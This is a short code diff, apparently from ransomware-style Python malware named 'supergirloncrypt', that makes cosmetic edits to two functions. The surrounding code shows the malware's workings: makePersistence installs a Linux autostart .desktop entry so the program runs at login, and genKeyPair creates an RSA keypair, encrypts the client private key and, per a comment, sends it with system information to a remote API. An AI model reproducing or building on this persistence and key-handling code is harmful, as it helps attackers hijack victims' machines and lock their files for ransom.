@@ -98,8 +98,7 @@ def makePersistence():
                 os.makedirs(home + '/.config/autostart')
             #load the desktop file and replace homedir
             with open(_helper.path('res/autostart_lin.desktop'), 'r') as f:
-                desktop_file = f.read()
-            desktop_file = desktop_file.replace("[home_folder]", home)
+                desktop_file = f.read().replace("[home_folder]", home)
             with open(home + '/.config/autostart/supergirloncrypt.desktop', 'w') as fout:
                 fout.write(desktop_file)
             os.system("chmod +x " + dest)
@@ -109,7 +108,7 @@ def makePersistence():
 
 def genKeyPair():
     keys = RSAKeyGen()
-    _helper.info("Keys generated!")
+    _helper.info("Public/Private Keypair generated!")
     cipher_cpriv_key = base64.b64encode(encryptClientPrivKey(keys.getPrivateKeyAsStr()))
     #send key and sys info to API
     os_info = platform.platform()
